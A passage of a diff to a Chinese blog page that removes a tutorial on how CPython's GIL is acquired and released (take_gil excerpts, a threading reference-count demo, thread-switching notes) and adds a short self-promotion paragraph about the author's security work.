&#125;</span><br><span class="line">  _ready:</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;* We now hold the GIL *&#x2F;</span><br><span class="line">  _Py_atomic_store_relaxed(&amp;gil-&gt;locked, 1);    &#x2F;&#x2F; 抢到了锁</span><br><span class="line">  _Py_ANNOTATE_RWLOCK_ACQUIRED(&amp;gil-&gt;locked, &#x2F;*is_write&#x3D;*&#x2F;1);</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<pre><code>这里我有一个疑问：上面的代码中，如果多个线程同时跳出while循环，就会出现多个线程同时抢到GIL。
-
-我的疑问肯定是不对的，两个线程肯定不会同时抢到GIL，那是怎么做到的呢？见后面分析</code></pre>
-<ol start="5">
-<li><p>怎么保证两个线程不会同时抢到GIL？</p>
-<p> 在ceval_gil.h#184行代码中，可以看到，用了一个互斥锁。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">take_gil(struct _ceval_runtime_state *ceval, PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    struct _gil_runtime_state *gil &#x3D; &amp;ceval-&gt;gil;</span><br><span class="line">    int err &#x3D; errno;</span><br><span class="line">    MUTEX_LOCK(gil-&gt;mutex);   &#x2F;&#x2F; gil-&gt;mutex是互斥锁</span><br><span class="line">    ...</span><br><span class="line">    MUTEX_UNLOCK(gil-&gt;mutex);</span><br></pre></td></tr></table></figure>
-
-<p> 这样在多个线程都调用take_gil来申请GIL时，只有一个线程能够跳出while循环申请到GIL。</p>
-</li>
-</ol>
-<pre><code>现在已经知道了什么时候释放和申请GIL，可以做一个小结：
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 已经获得GIL的线程在执行字节码前，如果有其他线程要求释放GIL，它就会释放GIL。</span><br><span class="line">* 没有获得GIL的线程可以分为两种情况：</span><br><span class="line">  * 有一个线程可以要求&quot;已经获得GIL的线程&quot;释放GIL，并且循环等待释放GIL</span><br><span class="line">  * 其他线程在等 gil-&gt;mutex 锁</span><br></pre></td></tr></table></figure></code></pre>
-<ol start="6">
-<li><p>为什么CPython要保证只有一个线程在执行字节码？</p>
-<p> 换句话说，CPython中在执行字节码时，哪一部分不是线程安全的？</p>
-<p> 在CPython中引用计数的实现就不是线程安全的，为啥呢？</p>
-<p> 首先需要理解一个知识点：如果多线程场景中线程中的操作全部都是读操作，是线程安全的；如果多线程场景中线程中对同一个变量做修改操作，就不是线程安全的。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">n &#x3D; 1</span><br><span class="line"></span><br><span class="line">def CountDown(_):</span><br><span class="line">    print(n)  # 仅仅是打印n，是线程安全的</span><br><span class="line">    # n +&#x3D; 1    # 修改n的值，这里是非线程安全</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    t1 &#x3D; Thread(target&#x3D;CountDown, args&#x3D;[1])</span><br><span class="line">    t2 &#x3D; Thread(target&#x3D;CountDown, args&#x3D;[1])</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
-<p> 从写Python脚本的角度看：上面的Python代码中，我们不加锁是没有问题的。</p>
-<p> 从CPython角度看：在上面代码中，CPython在多线程中修改变量n的引用计数时，就会有”多线程对同一个变量做修改操作”，这个变量就是n的引用计数。这里就不是线程安全的，所以要加GIL。加了GIL后，只会有一个线程在修改n的引用计数。</p>
-</li>
-<li><p>CPython线程什么时候切换？</p>
-<p> 上面已经讲了一种切换方式：非持有GIL的线程过了一段时间就可以获得GIL，然后执行opcode。</p>
-<p> 除了这种，在线程等待io、调用sleep函数时，也会主动释放GIL，以便其他线程有机会获得GIL。</p>
-<p> 所以存在切换存在两种方式：主动调度和抢占式调度</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 主动调度</span><br><span class="line">    * 等待io</span><br><span class="line">    * sleep</span><br><span class="line">* 抢占式</span><br><span class="line">    * 执行N个opcode （python3.2之前）</span><br><span class="line">    * 过了一段时间之后 （python3.2之后）</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/103834" title="23 | 你真的懂Python GIL（全局解释器锁）吗？">23 | 你真的懂Python GIL（全局解释器锁）吗？</a></p>
-<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4419179/blog/4305933" title="Python3 源码阅读-深入了解Python GIL">Python3 源码阅读-深入了解Python GIL</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/zpoint/CPython-Internals/blob/master/Interpreter/gil/gil_cn.md" title="gil">gil</a></p>
+<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
+<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
+<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
 
       
     </div>
@@ -1519,7 +1447,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
